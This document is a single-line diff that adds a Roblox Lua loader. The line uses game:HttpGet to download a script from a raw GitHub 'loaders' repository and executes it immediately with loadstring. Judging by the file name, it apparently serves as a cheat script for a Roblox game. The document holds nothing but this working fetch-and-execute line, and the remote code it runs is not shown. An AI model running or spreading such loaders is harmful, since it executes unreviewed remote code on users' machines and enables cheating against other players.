@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/don-t-get-fired-at-work-spam6-w13czsz3odto8j.lua"))()
